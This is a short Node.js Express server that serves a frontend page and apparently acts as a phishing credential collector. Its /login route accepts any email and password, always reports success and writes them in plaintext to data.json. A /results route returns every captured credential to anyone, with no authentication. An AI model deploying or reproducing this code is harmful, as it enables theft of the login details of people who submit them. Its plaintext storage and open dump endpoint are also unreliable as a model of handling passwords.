const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = 5000;

// Middleware
app.use(express.json());

// 🔥 Serve frontend from public folder
app.use(express.static(path.join(__dirname, "../public")));

// 📂 Data file path
const filePath = path.join(__dirname, "data.json");

// Ensure data.json exists
if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, "[]");
}


// 🔐 LOGIN ROUTE (store data)
app.post("/login", (req, res) => {
    const { email, password } = req.body;

    const data = JSON.parse(fs.readFileSync(filePath));

    const newEntry = {
        email,
        password,
        time: new Date().toISOString()
    };

    data.push(newEntry);

    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

    res.json({ success: true });
});


// 📊 RESULTS ROUTE (send data)
app.get("/results", (req, res) => {
    const data = JSON.parse(fs.readFileSync(filePath));
    res.json(data);
});


// 🚀 Start server
app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
    console.log("Serving from:", path.join(__dirname, "../public"));
});